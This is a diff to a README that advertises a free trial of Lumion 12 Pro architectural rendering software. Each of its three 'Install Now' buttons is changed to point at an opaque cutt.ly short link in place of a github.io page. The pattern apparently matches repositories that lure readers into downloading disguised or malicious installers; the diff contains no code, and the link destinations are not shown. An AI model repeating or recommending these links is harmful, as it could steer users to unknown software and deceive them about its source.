@@ -7,8 +7,8 @@
 
 🌄 Discover stunning architectural visualizations with the Lumion 12 Pro free trial! This repository offers tutorials, resources, and tips for architects and designers to explore trial tools for rendering, animation, and scene creation. Join our community to master the trial version in 2025!  
 
-<a href="https://rendercrafthub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+ <a href="https://cutt.ly/GrNt1uHc" target="_blank">
+  <img src="https://img.shields.io/badge/Install-Now-3498db" alt="Setup Guide Now" width="200" height="60" style="border:none;">
 </a>
 
 
@@ -22,8 +22,8 @@
 - ✅ **Community Hub**: Connect with architects and visualization enthusiasts.  
 - ✅ **Workflow Tips**: Optimize your trial rendering process.  
 
-<a href="https://rendercrafthub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+ <a href="https://cutt.ly/GrNt1uHc" target="_blank">
+  <img src="https://img.shields.io/badge/Install-Now-3498db" alt="Setup Guide Now" width="200" height="60" style="border:none;">
 </a>
 
 ### 💻 System Requirements  
@@ -34,8 +34,8 @@
 - **Processor**: Intel/AMD (3.0GHz+, CPUMark 2,000+)  
 - **Graphics**: GPU with G3DMark 7,000+ (e.g., NVIDIA GTX 1660, AMD RX 580)  
 
-<a href="https://rendercrafthub.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+ <a href="https://cutt.ly/GrNt1uHc" target="_blank">
+  <img src="https://img.shields.io/badge/Install-Now-3498db" alt="Setup Guide Now" width="200" height="60" style="border:none;">
 </a>
 
 ### 🌟 What Makes It Great  
